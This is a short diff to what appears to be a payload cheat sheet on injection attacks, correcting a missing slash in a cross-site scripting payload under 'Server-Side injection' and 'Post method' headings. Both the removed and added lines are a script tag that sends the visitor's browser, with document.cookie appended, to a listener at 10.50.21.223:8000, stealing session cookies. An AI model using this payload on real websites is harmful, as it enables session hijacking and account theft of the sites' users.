@@ -1,4 +1,4 @@
-    <script>document.location="http://10.50.21.223:8000"+document.cookie;</script>
+    <script>document.location="http://10.50.21.223:8000/"+document.cookie;</script>
 ________________________________________________________________________________________________________________
 ## Server-Side injection
 ## Post method: 
